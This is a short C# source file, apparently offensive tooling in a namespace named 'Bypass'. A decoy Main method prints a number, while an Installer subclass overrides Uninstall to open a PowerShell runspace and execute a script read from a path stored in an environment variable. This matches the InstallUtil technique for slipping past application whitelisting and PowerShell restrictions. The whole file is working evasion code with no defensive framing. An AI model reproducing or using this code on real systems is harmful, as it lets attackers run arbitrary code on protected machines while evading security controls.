using System;
using System.IO;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;

namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine(1+2);
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            using(Runspace rs = RunspaceFactory.CreateRunspace()) {
                rs.Open();

                PowerShell ps = PowerShell.Create();
                ps.Runspace = rs;

                ps.AddScript(File.ReadAllText(Environment.GetEnvironmentVariable("sumikko")));
                foreach (PSObject result in ps.Invoke()) {
                    Console.WriteLine("{0}", result);
                }
                rs.Close();
            }
        }
    }
}
